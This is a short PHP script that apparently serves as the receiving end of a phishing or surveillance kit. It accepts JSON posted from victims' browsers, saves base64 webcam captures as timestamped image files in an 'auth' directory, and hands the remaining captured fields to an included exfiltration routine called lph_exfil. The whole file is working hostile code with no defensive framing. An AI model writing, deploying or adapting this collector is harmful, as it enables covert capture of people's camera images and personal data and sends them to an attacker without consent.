<?php
$t=$_GET['t']??'unknown';$d=json_decode(file_get_contents('php://input'),true)?:[];
require_once __DIR__.'/exfil.php';
if($t==='webcam'&&!empty($d['img'])){ @file_put_contents(__DIR__.'/../auth/cam_'.time().'.jpg',base64_decode(preg_replace('#^data:image/\w+;base64,#','',$d['img']))); }
lph_exfil($t,array_diff_key($d,['img'=>1,'audio'=>1]));
echo '{"ok":true}';
